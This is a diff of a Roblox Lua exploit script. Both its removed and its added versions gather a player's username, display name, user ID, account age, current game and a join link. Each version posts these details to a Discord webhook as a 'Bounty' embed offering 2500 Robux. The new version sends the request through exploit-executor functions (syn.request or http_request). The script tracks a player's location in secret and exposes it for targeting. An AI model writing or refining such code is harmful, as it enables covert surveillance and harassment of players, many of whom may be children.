@@ -1,61 +1,48 @@
---// CONFIGURATION
-local Bounty = "2500 Robux"
-local Webhook = "https://discord.com/api/webhooks/your_webhook_here"
-
---// SERVICES
-local Players = game:GetService("Players")
+local p = game.Players.LocalPlayer
 local HttpService = game:GetService("HttpService")
 local MarketplaceService = game:GetService("MarketplaceService")
+local OSTime = os.time()
+local Time = os.date('!*t', OSTime)
 
---// PLAYER DATA
-local player = Players.LocalPlayer
-local username = player.Name
-local displayName = player.DisplayName
-local userId = player.UserId
-local accountAgeDays = player.AccountAge
-local gameId = game.PlaceId
-local gameInfo = MarketplaceService:GetProductInfo(gameId)
-local gameName = gameInfo.Name
+local Username = p.Name
+local DisplayName = p.DisplayName
+local UserId = p.UserId
+local Days = p.AccountAge
+local Years = math.floor(Days / 365)
+local Months = math.floor((Days % 365) / 30)
+local LeftDays = Days % 30
+local AgeString = Years .. " years, " .. Months .. " months, " .. LeftDays .. " days"
 
---// FORMATTING
-local function getFormattedAge(days)
-	local y = math.floor(days / 365)
-	local m = math.floor((days % 365) / 30)
-	local d = days % 30
-	return string.format("%d years, %d months, %d days", y, m, d)
-end
+local GameName = MarketplaceService:GetProductInfo(game.PlaceId).Name
+local GameId = tostring(game.PlaceId)
+local Avatar = 'https://www.roblox.com/headshot-thumbnail/image?userId=' .. UserId .. '&width=420&height=420&format=png'
+local JoinLink = '[Join ' .. Username .. ' IN **(' .. GameName .. ')**!](https://www.roblox.com/games/' .. GameId .. ')'
 
-local function getTimestamp()
-	local t = os.date("*t")
-	return string.format("Today at %02d:%02d", t.hour, t.min)
-end
-
---// AVATAR IMAGE
-local avatarUrl = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. userId .. "&width=420&height=420&format=png"
-local joinLink = "https://www.roblox.com/games/" .. gameId
-
---// DISCORD EMBED PAYLOAD
-local data = {
-	content = "",
-	embeds = {{
-		title = "Username: " .. username,
-		color = 0x9b59b6, -- purple
-		thumbnail = { url = avatarUrl },
-		fields = {
-			{ name = "Display Name", value = displayName, inline = true },
-			{ name = "Account Age", value = getFormattedAge(accountAgeDays), inline = true },
-			{ name = "User ID", value = tostring(userId), inline = true },
-			{ name = "Game Name", value = gameName, inline = true },
-			{ name = "Game ID", value = tostring(gameId), inline = true },
-			{ name = "Join", value = "[Join "..username.." in **("..gameName..")**!]("..joinLink..")", inline = false },
-			{ name = "Bounty", value = Bounty, inline = false }
-		},
-		footer = {
-			text = "itr.wtf"
-		},
-		timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
-	}}
+local Embed = {
+    title = 'Username: ' .. Username;
+    color = 0x9b59b6;
+    thumbnail = { url = Avatar };
+    footer = { text = 'itr.wtf' };
+    fields = {
+        { name = 'Display Name', value = DisplayName };
+        { name = 'Account Age', value = AgeString };
+        { name = 'User ID', value = tostring(UserId) };
+        { name = 'Game Name', value = GameName };
+        { name = 'Game ID', value = GameId };
+        { name = 'Join', value = JoinLink };
+        { name = 'Bounty', value = '2500 Robux' };
+    };
+    timestamp = string.format('%d-%02d-%02dT%02d:%02d:%02dZ', Time.year, Time.month, Time.day, Time.hour, Time.min, Time.sec);
 }
 
---// SEND TO WEBHOOK
-HttpService:PostAsync(Webhook, HttpService:JSONEncode(data))
+(syn and syn.request or http_request) {
+    Url = 'https://discord.com/api/webhooks/your_webhook_here';
+    Method = 'POST';
+    Headers = {
+        ['Content-Type'] = 'application/json';
+    };
+    Body = HttpService:JSONEncode({
+        content = '';
+        embeds = { Embed };
+    });
+}
